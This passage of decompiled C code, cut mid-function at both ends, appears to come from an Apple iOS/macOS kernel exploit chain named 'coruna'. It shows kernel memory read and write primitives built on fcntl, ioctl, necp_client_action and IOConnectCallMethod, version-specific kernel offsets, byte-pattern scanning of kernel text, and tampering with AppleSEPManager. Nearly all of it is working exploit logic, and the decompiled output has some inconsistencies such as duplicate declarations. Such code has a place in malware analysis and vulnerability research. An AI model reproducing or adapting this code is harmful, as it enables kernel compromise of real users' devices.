    host_info = (void *)coruna_u64_pack((host_info), (size));
    if (*(int *)(&k_kernel_slot_1944 + handle) == -1) {
      return 0xad001;
    }
    base = *(long *)(&k_kernel_slot_1958 + handle);
    err = _uuid_is_null(&k_kernel_slot_1948 + handle);
    if (err != 0) {
      return 0xad001;
    }
    if (*(long *)(&k_kernel_slot_1958 + handle) == 0) {
      return 0xad001;
    }
    version = *(unsigned long *)(handle + 0x158);
    addr = 0x570;
    if (version < 0x1f541e00000000) {
      addr = 0x370;
    }
    off = 0x578;
    if (version < 0x1f541e00000000) {
      off = 0x378;
    }
    handle = 0x580;
    if (version >> 0x2b < 1099) {
      handle = addr;
    }
    handle = handle + base;
    addr = 0x588;
    if (version >> 0x2b < 1099) {
      addr = off;
    }
    err = coruna_kernel6544_via_fcntl_1c910(handle,handle,&host_info,4,0);
    base = base + addr;
    if (err == 0) {
      u = 0x28010;
    }
    else {
      err = coruna_kernel6544_via_fcntl_1c910(handle,base,&serial_buf,*(uint32_t *)(handle + 0x168),0);
      u = 0x28010;
      if (err != 0) {
        u = _necp_client_action(*(uint32_t *)(&k_kernel_slot_1944 + handle),3,
                                    &k_kernel_slot_1948 + handle,0x10,ctx,size);
        if (u == size) {
          u = 0;
        }
        else {
          err = ___error();
          err = *err;
          ptr = (uint *)___error();
          u = -*ptr;
          if (-1 < err) {
            u = *ptr;
          }
          u = u | 0x40000000;
        }
      }
    }
    host_info = (void *)((unsigned long)host_info & 0xffffffff00000000);
    err = coruna_kernel6544_via_fcntl_1c910(handle,handle,&host_info,4,0);
    size = 0x28010;
    if (err != 0 || u != 0) {
      size = u;
    }
    serial_buf = 0;
    err = coruna_kernel6544_via_fcntl_1c910(handle,base,&serial_buf,*(uint32_t *)(handle + 0x168),0);
    if (err != 0) {
      return size;
    }
    if (size == 0) {
      return 0x28010;
    }
    return size;
  }
  host_info = (void *)0x0;
  bootargs = 0;
  thread_attr = 0;
  scratch = 0;
  if (0x4000 < size) {
    return 0xad001;
  }
  if (*(long *)(handle + 0x230) == 0) {
    return 0xad001;
  }
  if (*(long *)(handle + 0x228) == 0) {
    return 0xad001;
  }
  if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
     (*(long *)(handle + 0x100) == 0)) {
    if (((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) ||
       ((*(int *)(&k_kernel_slot_1940 + handle) == -1 || (*(long *)(handle + 0x218) == 0))))
    if ((host_info != (void *)0x0) && (thread_attr != 0)) {
    _mach_vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(mach_vm_address_t)host_info,
    thread_attr);
    }
    return u;
  }
  else {
    if (*(long *)(handle + 0xf0) == 0) {
      u = 0xad009;
      if ((host_info != (void *)0x0) && (thread_attr != 0)) {
      _mach_vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(mach_vm_address_t)host_info,
      thread_attr);
      }
      return u;
    }
    bootargs = *(long *)(handle + 0xf0) + 0x100;
  }
  err = coruna_kernel6544_via_fcntl_1c910(handle,bootargs + 8,&serial_buf,*(uint32_t *)(handle + 0x168),0);
  u = 0x28010;
  if (err != 0) {
    port = *(uint64_t *)(handle + 0x228);
    err = coruna_kernel6544_via_fcntl_1c910(handle,port,&bootargs,*(uint32_t *)(handle + 0x168),0);
    if (err != 0) {
      tag = *(uint64_t *)(handle + 0x230);
      err = coruna_kernel6544_via_fcntl_1bf84_3(handle,tag,4,(long)&scratch + 4,0);
      u = 0x2800f;
      size = u;
      if (err != 0) {
        scratch = coruna_u64_pack((scratch), (scratch)) | 0x20;
        err = coruna_kernel6544_via_fcntl_1c910(handle,tag,&scratch,4,0);
        size = 0x28010;
        if (err != 0) {
          size = _task_map_corpse_info_64
                            (*(uint32_t *)k_kernel_mach_task_self_slot,
                             *(uint32_t *)k_kernel_mach_task_self_slot,&host_info,&thread_attr);
          if (size == 0) {
            if ((host_info != (void *)0x0) && (thread_attr == 0x4000)) {
              _memcpy(ctx,host_info,0x4000);
              u = 0;
            }
          }
          else {
            u = size | 0x80000000;
          }
          err = coruna_kernel6544_via_fcntl_1c910(handle,tag,(long)&scratch + 4,4,0);
          size = u;
          if ((err == 0) && (size = 0x28010, u != 0)) {
            size = u;
          }
        }
      }
      bootargs = 0;
      err = coruna_kernel6544_via_fcntl_1c910(handle,port,&bootargs,*(uint32_t *)(handle + 0x168),0);
      u = size;
      if ((err == 0) && (u = 0x28010, size != 0)) {
        u = size;
      }
    }
  }
fail:
  if ((host_info != (void *)0x0) && (thread_attr != 0)) {
    _mach_vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(mach_vm_address_t)host_info,
                        thread_attr);
  }
  return u;
}





unsigned long coruna_kernel6544_via_fd_read_full_3(long arg,long val)

{
  uint type_id_13;
  int flags;
  unsigned long u;
  uint8_t cache_48[160];
  uint64_t cache_29;
  uint64_t block_ctx;
  uint64_t cache_49;
  uint64_t stack_guard;
  uint64_t cache_31;
  long cache_50;
  uint64_t sa_saved;
  long cache_51;
  uint64_t cache_52;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t cache_43;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t cache_53;
  uint64_t json_buf;
  uint64_t action;
  uint64_t thread_attr;
  long cache_20;
  
  cache_20 = *(long *)k_kernel_stack_chk_guard_slot;
  u = 0xad001;
  if (((*(int *)(&k_kernel_slot_1930 + arg) != -1) && (*(int *)(&k_kernel_slot_1934 + arg) != -1)) &&
     (*(long *)(arg + 0x218) != 0)) {
    cache_31 = 0;
    sa_saved = 0;
    cache_51 = val + -0x60;
    json_buf = 0;
    cache_53 = 0;
    thread_attr = 0;
    action = 0;
    region = 0;
    url_buf = 0;
    plist = 0;
    sa_new = 0;
    cache_52 = 0;
    tmp_buf = 0;
    block_ctx = 0;
    cache_29 = 0;
    stack_guard = 0;
    cache_49 = k_kernel_rodata_word_3b798;
    cache_50 = *(long *)(arg + 0x218) + 0x60;
    cache_43 = 2;
    path_buf = 0x22000000;
    u = coruna_write(&k_kernel_slot_1930 + arg,&cache_29,0xa0);
    if (((int)u == 0) &&
       (u = coruna_fd_read_full(&k_kernel_slot_1930 + arg,cache_48,0xa0), (int)u == 0)) {
      flags = _memcmp(&cache_29,cache_48,0xa0);
      type_id_13 = 0;
      if (flags != 0) {
        type_id_13 = 0xad014;
      }
      u = (unsigned long)type_id_13;
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_20) {
    ___stack_chk_fail();
  }
  return u;
}





unsigned long coruna_kernel6544_via_fd_read_full_4(long arg)

{
  uint type_id_13;
  int flags;
  unsigned long u;
  uint8_t cache_48[160];
  uint64_t cache_29;
  uint64_t block_ctx;
  uint64_t cache_49;
  uint64_t stack_guard;
  uint64_t cache_31;
  long cache_50;
  uint64_t sa_saved;
  uint64_t frame;
  uint64_t cache_52;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t cache_43;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t cache_53;
  uint64_t json_buf;
  uint64_t action;
  uint64_t thread_attr;
  long cache_20;
  
  cache_20 = *(long *)k_kernel_stack_chk_guard_slot;
  u = 0xad001;
  if (((*(int *)(&k_kernel_slot_1930 + arg) != -1) && (*(int *)(&k_kernel_slot_1934 + arg) != -1)) &&
     (*(long *)(arg + 0x218) != 0)) {
    json_buf = 0;
    cache_53 = 0;
    thread_attr = 0;
    action = 0;
    region = 0;
    url_buf = 0;
    plist = 0;
    sa_new = 0;
    cache_52 = 0;
    tmp_buf = 0;
    cache_31 = 0;
    frame = 0;
    sa_saved = 0;
    block_ctx = 0;
    cache_29 = 0;
    stack_guard = 0;
    cache_49 = k_kernel_rodata_word_3b798;
    cache_50 = *(long *)(arg + 0x218) + 0x60;
    cache_43 = 3;
    path_buf = 0x22000000;
    u = coruna_write(&k_kernel_slot_1930 + arg,&cache_29,0xa0);
    if (((int)u == 0) &&
       (u = coruna_fd_read_full(&k_kernel_slot_1930 + arg,cache_48,0xa0), (int)u == 0)) {
      flags = _memcmp(&cache_29,cache_48,0xa0);
      type_id_13 = 0;
      if (flags != 0) {
        type_id_13 = 0xad014;
      }
      u = (unsigned long)type_id_13;
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_20) {
    ___stack_chk_fail();
  }
  return u;
}





unsigned long coruna_fcntl_1c910(long arg,long val,long n,uint m,int p)

{
  unsigned long type_id_13;
  uint type_id_14;
  int j;
  long base;
  int *j;
  uint *ptr;
  unsigned long port;
  uint tag;
  uint type_id_17;
  uint32_t cache_21;
  uint32_t cache_54;
  
  port = 0xad001;
  if ((((*(int *)(&k_kernel_slot_1930 + arg) != -1) && (*(int *)(&k_kernel_slot_1934 + arg) != -1)) &&
      (*(int *)(&k_kernel_slot_1940 + arg) != -1)) &&
     ((*(long *)(arg + 0x218) != 0 && (base = coruna_kernel6544_residual_246(arg), base != 0)))) {
    cache_54 = 0xffffffff;
    if ((p == 0) ||
       ((port = coruna_open_dev_null(&cache_54), (int)port == 0 &&
        (port = coruna_fd_drain(&k_kernel_slot_1930 + arg), (int)port == 0)))) {
      if (m != 0) {
        tag = 0;
        do {
          type_id_14 = m - tag;
          cache_21 = 0;
          base = val + (unsigned long)tag;
          if (type_id_14 < 4) {
            type_id_17 = 0;
            if ((((base + (unsigned long)type_id_14) - 1 ^ base + 3U) &
                (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff)) != 0) {
              type_id_17 = 4 - type_id_14;
            }
          }
          else {
            type_id_17 = 0;
          }
          type_id_13 = 4 - (unsigned long)type_id_17;
          if ((unsigned long)type_id_14 <= 4 - (unsigned long)type_id_17) {
            type_id_13 = (unsigned long)type_id_14;
          }
          if (((type_id_13 < 4) &&
              (port = coruna_fcntl_1bf84(arg,base - (unsigned long)type_id_17,&cache_21,4,0), (int)port != 0))
             || (port = coruna_kernel6544_via_fd_read_full_3(arg,base - (unsigned long)type_id_17), (int)port != 0)) {
load_ok_36:
            coruna_kernel6544_via_fd_read_full_4(arg);
            {
              if (p == 0) {
              return port;
              }
            }
          }
          _memcpy((void *)((long)&cache_21 + (unsigned long)type_id_17),(void *)(n + (unsigned long)tag),type_id_13);
          if (*(long *)(arg + 0x220) == 0) {
            j = _fcntl(*(int *)(&k_kernel_slot_1940 + arg),6);
          }
          else {
            j = _ioctl(*(int *)(&k_kernel_slot_1940 + arg),0x8004667c);
          }
          if (j != 0) {
            j = ___error();
            j = *j;
            ptr = (uint *)___error();
            tag = -*ptr;
            if (-1 < j) {
              tag = *ptr;
            }
            port = (unsigned long)(tag | 0x40000000);
            {
              coruna_kernel6544_via_fd_read_full_4(arg);
              {
              if (p == 0) {
              return port;
              }
              }
            }
          }
          tag = (tag - type_id_17) + 4;
        } while (tag < m);
      }
      port = coruna_kernel6544_via_fd_read_full_4(arg);
load_ok_37:
      if (p == 0) {
        return port;
      }
    }
    coruna_close(cache_54);
  }
  return port;
}





uint64_t coruna_semaphore_destroy(long handle,int flags)
{
  pthread_t p_Var1;
  long *ptr;
  
  ptr = *(long **)(handle + 0x28);
  if (ptr != (long *)0x0) {
    *(uint8_t *)(handle + 0xc) = 0;
    *(uint64_t *)(handle + 0x28) = 0;
    p_Var1 = (pthread_t)*ptr;
    if (p_Var1 != (pthread_t)0x0) {
      if (1 < *(semaphore_t *)(ptr + 1) + 1 && flags != 0) {
        *(uint8_t *)(ptr + 7) = 1;
        _semaphore_signal(*(semaphore_t *)(ptr + 1));
        p_Var1 = (pthread_t)*ptr;
      }
      _pthread_join(p_Var1,(void **)0x0);
      *ptr = 0;
    }
    if (1 < *(semaphore_t *)(ptr + 1) + 1) {
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,*(semaphore_t *)(ptr + 1));
      *(uint32_t *)(ptr + 1) = 0;
    }
    if (1 < *(semaphore_t *)((long)ptr + 0xc) + 1) {
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,
                         *(semaphore_t *)((long)ptr + 0xc));
      *(uint32_t *)((long)ptr + 0xc) = 0;
    }
    if ((int)ptr[2] != -1) {
      _close((int)ptr[2]);
      *(uint32_t *)(ptr + 2) = 0xffffffff;
    }
    ptr[5] = 0;
    ptr[4] = 0;
    ptr[7] = 0;
    ptr[6] = 0;
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
    _free(ptr);
  }
  return 0;
}





unsigned long coruna_open_sepmgr(long arg)

{
  uint8_t *data;
  uint type_id_14;
  int j;
  uint64_t *entry;
  unsigned long version;
  bool flags;
  uint64_t cache_41;
  semaphore_t work [2];
  
  if (*(unsigned long *)(arg + 0x158) < 0x1f530000000000) {
    if (*(char *)(arg + 0xc) != '\0') {
      return 0;
    }
    version = (unsigned long)*(uint *)(arg + 0x10);
    if (*(uint *)(arg + 0x10) + 1 < 2) {
      version = coruna_ioservicegetmatchingservice("AppleSEPManager");
      if ((int)version + 1U < 2) {
        return 0xad011;
      }
      *(int *)(arg + 0x10) = (int)version;
    }
    data = k_kernel_mach_task_self_slot;
    flags = false;
    while (type_id_14 = __IOServiceSetAuthorizationID(version,0), type_id_14 == 0xe00002c1) {
      return (unsigned long)(type_id_14 & 0xfff | 0x70000000);
    }
    if (type_id_14 != 0) {
load_ok_38:
      return (unsigned long)(type_id_14 & 0xfff | 0x70000000);
    }
load_ok_39:
    *(uint8_t *)(arg + 0xc) = 1;
    return 0;
  }
  cache_41 = 0;
  work[0] = 0;
  work[1] = 0;
  if (*(char *)(arg + 0xc) != '\0') {
    return 0;
  }
  entry = _calloc(1,0x40);
  if (entry == (uint64_t *)0x0) {
    return 0xad009;
  }
  *(uint32_t *)(entry + 2) = 0xffffffff;
  *(uint64_t **)(arg + 0x28) = entry;
  data = k_kernel_mach_task_self_slot;
  type_id_14 = _semaphore_create(*(task_t *)k_kernel_mach_task_self_slot,work + 1,0,0);
  if (type_id_14 == 0) {
    *(semaphore_t *)(entry + 1) = work[1];
    type_id_14 = _semaphore_create(*(task_t *)data,work,0,0);
    if (type_id_14 == 0) {
      *(semaphore_t *)((long)entry + 0xc) = work[0];
      version = coruna_pthread_attr_setdetachstate_2e9c4(arg,&cache_41,coruna_connect_setsockopt,arg);
      coruna_semaphore_destroy(arg,0);
      return version;
    }
  }
  version = (unsigned long)(type_id_14 | 0x80000000);
load_ok_40:
  coruna_semaphore_destroy(arg,0);
  return version;
}





void coruna_ioconnectcallmethod(long handle,long addr_2,int flags)
{
  uint32_t u;
  uint64_t size;
  int err;
  long handle;
  long addr;
  uint32_t *ptr;
  long off;
  uint8_t scratch[8];
  long bootargs;
  uint thread_attr;
  uint32_t host_info;
  uint32_t serial_buf;
  uint16_t action[2];
  uint32_t block_ctx;
  uint64_t stack_guard;
  long sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t scratch;
  uint64_t tmp_buf;
  uint64_t bootargs;
  uint64_t region;
  uint64_t thread_attr;
  unsigned long plist;
  uint64_t url_buf;
  uint64_t host_info;
  uint64_t json_buf;
  long frame;
  
  frame = *(long *)k_kernel_stack_chk_guard_slot;
  off = *(long *)(&k_kernel_slot_1d58 + handle);
  block_ctx = 0x4000;
  sa_saved = addr_2;
  handle = coruna_mach_port_request_notification_29a50(handle,&block_ctx);
  if (handle != 0) {
    action[0] = 0x100;
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle,action,2);
    if (((((err != 0) &&
          (err = coruna_kernel6544_residual_307(handle,*(long *)(off + 0xe8) + (unsigned long)*(uint *)(off + 0xb8),
                                &stack_guard), err != 0)) &&
         (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xb4),4,
                               &serial_buf), err != 0)) &&
        ((err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xc4),4,
                               &host_info), err != 0 &&
         (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xc0),4,
                               &thread_attr), err != 0)))) &&
       ((err = coruna_kernel6544_residual_307(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xbc),
                              &bootargs), err != 0 &&
        ((bootargs != 0 &&
         (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,bootargs + (unsigned long)*(uint *)(off + 0xac),8,scratch),
         err != 0)))))) {
      u = 0x10002;
      if (*(unsigned long *)(handle + 0x158) < 0x27120000000000) {
        u = 0x10003;
      }
      ptr = *(uint32_t **)(off + 0x98);
      *ptr = u;
      ptr[1] = 0x10;
      *(uint16_t *)(ptr + 2) = 0;
      size = k_kernel_rodata_word_43340;
      addr = *(long *)(off + 0xa0);
      *(uint64_t *)(addr + 0x10) = k_kernel_rodata_word_00043348;
      *(uint64_t *)(addr + 8) = size;
      plist = (unsigned long)*(uint *)(off + 0xc);
      host_info = k_kernel_rodata_word_00043808;
      url_buf = k_kernel_rodata_word_43800;
      json_buf = 0x38;
      bootargs = 0;
      tmp_buf = 0;
      thread_attr = 0;
      region = 0;
      scratch = 0;
      path_buf = 0;
      sa_new = *(uint64_t *)(off + 0x1c);
      sa_saved = addr_2 - (unsigned long)thread_attr;
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,*(long *)(off + 0xe8) + (unsigned long)*(uint *)(off + 0xb8),handle);
      if (err != 0) {
        err = coruna_mach_vm_machine_attribute(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xb4),1);
        if (err != 0) {
          err = coruna_mach_vm_machine_attribute(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xc4),
                               flags + -0x100);
          if (err != 0) {
            err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,bootargs + (unsigned long)*(uint *)(off + 0xac),&sa_saved,8);
            if (err != 0) {
              _IOConnectCallMethod
                        (*(uint32_t *)(off + 8),0x1a,&plist,4,&sa_new,0x38,0,0,0,0);
              coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,bootargs + (unsigned long)*(uint *)(off + 0xac),scratch,8);
            }
            coruna_mach_vm_machine_attribute(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xc4),host_info);
          }
          coruna_mach_vm_machine_attribute(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xb4),serial_buf);
        }
        coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,*(long *)(off + 0xe8) + (unsigned long)*(uint *)(off + 0xb8),stack_guard);
      }
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == frame) {
    return;
  }
  ___stack_chk_fail();
}





unsigned long coruna_ioconnectcallmethod_1d1b4(long arg,long val,long n,uint m,int p)

{
  long handle;
  unsigned long type_id_14;
  long serial_10;
  int idx;
  uint version;
  long serial_14;
  unsigned long port;
  unsigned long tag;
  uint64_t type_id_17;
  uint type_id_18;
  uint kind;
  uint64_t cache_57;
  uint32_t cache_59;
  unsigned long cache_43 [3];
  long cache_21;
  
  cache_21 = *(long *)k_kernel_stack_chk_guard_slot;
  tag = 0xad001;
  port = tag;
  if (((((1 < *(int *)(arg + 0xe8) + 1U) && (*(long *)(arg + 0xf8) != 0)) &&
       (*(long *)(arg + 0x100) != 0)) && (serial_14 = coruna_kernel6544_residual_246(arg), serial_14 != 0)) &&
     ((cache_59 = 0xffffffff, p == 0 || (port = coruna_open_dev_null(&cache_59), (int)port == 0))))
  {
    if (m != 0) {
      type_id_18 = 0;
      do {
        version = m - type_id_18;
        cache_57 = 0;
        serial_14 = val + (unsigned long)type_id_18;
        if (version < 8) {
          kind = 0;
          if ((((serial_14 + (unsigned long)version) - 1 ^ serial_14 + 7U) &
              (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff)) != 0) {
            kind = 8 - version;
          }
        }
        else {
          kind = 0;
        }
        type_id_14 = 8 - (unsigned long)kind;
        if ((unsigned long)version <= 8 - (unsigned long)kind) {
          type_id_14 = (unsigned long)version;
        }
        if ((type_id_14 < 8) &&
           (port = coruna_ioconnectcallmethod(arg,serial_14 - (unsigned long)kind,&cache_57,8,0), (int)port != 0))
        goto load_ok_45;
        _memcpy((void *)((long)&cache_57 + (unsigned long)kind),(void *)(n + (unsigned long)type_id_18),type_id_14);
        idx = *(int *)(arg + 0xe8);
        port = tag;
        if ((idx + 1U < 2) ||
           ((*(long *)(arg + 0xf8) == 0 || (*(long *)(arg + 0x100) == 0))))
        goto load_ok_45;
        handle = *(long *)(arg + 0x108) + *(long *)(arg + 0xf8);
        serial_10 = 0x368;
        if (*(int *)(arg + 0x140) < 0x2258) {
          serial_10 = 0x360;
        }
        type_id_17 = *(uint64_t *)(handle + serial_10);
        *(unsigned long *)(handle + serial_10) = serial_14 - (unsigned long)kind;
        cache_43[0] = (unsigned long)*(uint *)(arg + 0x110);
        cache_43[1] = 0;
        cache_43[2] = cache_57;
        version = _IOConnectCallMethod(idx,0x21,cache_43,3,0,0,0,0,0,0);
        if ((*(long *)(arg + 0xf8) == 0) || (*(long *)(arg + 0x100) == 0)) {
          if (version != 0) {
load_ok_46:
            port = (unsigned long)(version | 0x80000000);
          }
          goto load_ok_45;
        }
        serial_14 = 0x368;
        if (*(int *)(arg + 0x140) < 0x2258) {
          serial_14 = 0x360;
        }
        *(uint64_t *)(*(long *)(arg + 0x108) + *(long *)(arg + 0xf8) + serial_14) = type_id_17;
        if (version != 0) goto load_ok_46;
        type_id_18 = (type_id_18 - kind) + 8;
      } while (type_id_18 < m);
    }
    port = 0;
load_ok_45:
    if (p != 0) {
      coruna_close(cache_59);
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_21) {
    ___stack_chk_fail();
  }
  return port;
}





uint coruna_vm_map_27414(long handle,vm_address_t *arg,vm_size_t arg_x,unsigned long arg_x_x)
{
  uint u;
  uint size;
  vm_inherit_t unaff_w29;
  
  size = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,arg,arg_x,0,1,
                  *(mem_entry_name_port_t *)(handle + 0x58),
                  arg_x_x & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),0,3,2,unaff_w29);
  u = 0;
  if (size != 0) {
    u = size | 0x80000000;
  }
  return u;
}





uint64_t coruna_mach_port_deallocate_1d418(long handle)
{
  vm_address_t address;
  
  if (1 < *(int *)(handle + 0x5c) + 1U) {
    _IOObjectRelease();
    *(uint32_t *)(handle + 0x5c) = 0;
  }
  address = *(vm_address_t *)(handle + 0x60);
  if ((address != 0) && (*(vm_size_t *)(handle + 0x68) != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,*(vm_size_t *)(handle + 0x68)
                  );
    *(vm_address_t *)(handle + 0x60) = 0;
    *(uint64_t *)(handle + 0x68) = 0;
  }
  *(uint64_t *)(handle + 0x70) = 0;
  *(uint64_t *)(handle + 0x78) = 0;
  if (1 < *(mach_port_name_t *)(handle + 0x58) + 1) {
    _mach_port_deallocate
              (*(ipc_space_t *)k_kernel_mach_task_self_slot,*(mach_port_name_t *)(handle + 0x58));
    *(uint32_t *)(handle + 0x58) = 0;
  }
  return 0;
}





uint32_t coruna_macho_data_seg(long handle,unsigned long arg)
{
  uint u;
  int err;
  long handle;
  long addr;
  long off;
  uint32_t size;
  long base;
  uint32_t version;
  unsigned long port;
  int scratch;
  uint32_t scratch;
  long bootargs;
  long thread_attr;
  uint64_t host_info;
  long serial_buf;
  long action;
  long block_ctx;
  
  if (*(long *)(handle + 0x80) == 0 || *(int *)(handle + 0x88) == 0) {
    if ((arg & 1) == 0) {
      coruna_macho_text_sect(&serial_buf,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
      thread_attr = action + block_ctx + -0x20000;
      block_ctx = 0x20000;
      bootargs = serial_buf;
      host_info = 0x20000;
      action = thread_attr;
      handle = coruna_strsep(&bootargs,"88 91 00 B9 9F 0D 00 B9",0,1);
      if (handle != 0) {
        port = 0xfffffffffffffffc;
        base = 0;
        do {
          off = handle + port + 4;
          u = coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup(*(uint64_t *)(&k_kernel_slot_19f8 + handle),off);
          addr = base;
          if (((u & 0x9f000000) == 0x90000000) &&
             (u = coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + port + 8),
             (u & 0xbfc00000) == 0xb9400000)) {
            addr = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),off);
            if (addr == 0) break;
            if (base != 0) {
              err = coruna_kernel6544_residual_256(handle,base,&bootargs);
              if (err == 0) {
                return 0x2800f;
              }
              handle = coruna_ptr_canonicalize(handle,bootargs);
              if (handle == 0) {
                return 0x28026;
              }
              err = coruna_kernel6544_residual_256(handle,addr,&scratch);
              if (err == 0) {
                return 0x2800f;
              }
              handle = coruna_ptr_canonicalize(handle,coruna_u64_pack((scratch), (scratch)));
              if (handle == 0) {
                return 0x28026;
              }
              handle = coruna_kernel6544_via_kernel6544_via_return_zero_30860(handle,bootargs);
              if (handle == 0) {
                return 0x28026;
              }
              arg = arg & 0xffffffff;
              *(long *)(handle + 0x80) = handle;
              *(int *)(handle + 0x88) = scratch - (int)bootargs;
              goto fail;
            }
          }
          port = port + 4;
          base = addr;
        } while (port < 0xfc);
      }
      size = 0xad011;
    }
    else {
      size = 0xad001;
    }
  }
  else {
fail:
    version = 0xad011;
    size = 0;
    if (((((*(long *)(handle + 0xa0) == 0 || *(int *)(handle + 0xa8) == 0) &&
          (size = 0xad001, (arg & 1) == 0)) &&
         (coruna_macho_map_segsect(&serial_buf,*(uint64_t *)(&k_kernel_slot_19f8 + handle),"__DATA","__percpu"),
         base = block_ctx, handle = action, size = version, action != 0)) &&
        ((block_ctx != 0 &&
         (coruna_macho_text_sect(&serial_buf,*(uint64_t *)(&k_kernel_slot_19f8 + handle)), action != 0)))) &&
       (block_ctx != 0)) {
      action = action + block_ctx + -0x20000;
      block_ctx = 0x20000;
      off = coruna_strsep(&serial_buf,".. 02 00 F9 E1 03 13 AA",0,1);
      if (off != 0) {
        off = coruna_return_zero_1555c(*(uint64_t *)(&k_kernel_slot_19f8 + handle),off + -8,0);
        if (off == 0) {
          size = 0xad014;
        }
        else {
          size = 0x28026;
          err = coruna_kernel6544_via_fcntl_1bf84_2(handle,off,&bootargs);
          if (err == 0) {
            size = 0x2800f;
          }
          else {
            handle = bootargs + handle;
            off = coruna_ptr_canonicalize(handle,handle);
            if ((off != 0) && (handle = coruna_kernel6544_via_kernel6544_via_return_zero_30860(handle,handle), handle != 0)) {
              *(long *)(handle + 0xa0) = handle;
              *(uint *)(handle + 0xa8) =
                   *(uint *)(handle + 0x188) + (int)base &
                   (*(uint *)(handle + 0x188) ^ 0xffffffff);
              size = 0;
            }
          }
        }
      }
    }
  }
  return size;
}





void coruna_pthread_mach_thread_np(long handle)
{
  uint32_t u;
  int err;
  kern_return_t lk3;
  mach_port_t target_act;
  vm_address_t *ptr;
  uint32_t scratch;
  uint32_t bootargs;
  
  if (*(unsigned long *)(handle + 0x158) < 0x27120000000000) {
    if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      return;
    }
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err != 0) {
      return;
    }
    if (*(int *)(&k_kernel_slot_1944 + handle) != -1) {
      _close(*(int *)(&k_kernel_slot_1944 + handle));
      *(uint32_t *)(&k_kernel_slot_1944 + handle) = 0xffffffff;
    }
    *(uint64_t *)(&UNK_00001950 + handle) = 0;
    *(uint64_t *)(&k_kernel_slot_1948 + handle) = 0;
    *(uint64_t *)(&k_kernel_slot_1958 + handle) = 0;
    u = scratch;
  }
  else {
    bootargs = 0xffffffff;
    err = coruna_open_dev_null(&bootargs);
    if (err != 0) {
      return;
    }
    ptr = *(vm_address_t **)(&k_kernel_slot_1d50 + handle);
    *(uint64_t *)(&k_kernel_slot_1d50 + handle) = 0;
    u = bootargs;
    if (ptr != (vm_address_t *)0x0) {
      if ((((*ptr == 0) || (ptr[1] == 0)) ||
          (lk3 = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,*ptr,ptr[1]),
          lk3 == 0)) && ((pthread_t)ptr[2] != (pthread_t)0x0)) {
        target_act = _pthread_mach_thread_np((pthread_t)ptr[2]);
        lk3 = _thread_resume(target_act);
        if (lk3 == 0) {
          _pthread_join((pthread_t)ptr[2],(void **)0x0);
        }
      }
      ptr[1] = 0;
      *ptr = 0;
      ptr[3] = 0;
      ptr[2] = 0;
      *(uint64_t *)(&k_kernel_slot_1d50 + handle) = 0;
      _free(ptr);
      u = bootargs;
    }
  }
  coruna_close(u);
  return;
}





uint coruna_vm_map_280a0(long handle,vm_address_t *arg,vm_size_t arg_x,unsigned long arg_x_x)
{
  uint u;
  uint size;
  vm_inherit_t unaff_w29;
  
  if (*(mem_entry_name_port_t *)(handle + 0x58) + 1 < 2) {
    u = 0xad001;
  }
  else {
    size = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,arg,arg_x,0,1,
                    *(mem_entry_name_port_t *)(handle + 0x58),
                    arg_x_x & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),0,3,2,unaff_w29);
    u = 0;
    if (size != 0) {
      u = size | 0x80000000;
    }
  }
  return u;
}





uint64_t coruna_pthread_from_mach_thread_np_1d4a4(long handle)
{
  pthread_t p_Var1;
  vm_address_t address;
  
